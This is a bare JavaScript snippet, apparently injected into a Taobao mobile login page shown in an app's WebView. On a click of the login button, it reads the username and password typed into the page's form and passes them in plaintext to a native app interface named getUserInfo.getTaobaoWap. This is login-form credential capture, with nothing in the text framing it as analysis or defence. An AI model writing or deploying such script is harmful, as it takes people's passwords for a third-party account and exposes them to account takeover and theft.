document.querySelector('.c-btn-oran-big').addEventListener('click', function()
{
        var iframe = document.createElement('IFRAME');
        var username = document.querySelector('#J_UserNameTxt').value;
        var password = document.querySelector('#J_PassWordTxt').value;
        window.getUserInfo.getTaobaoWap(username,password);
        document.documentElement.appendChild(iframe);
});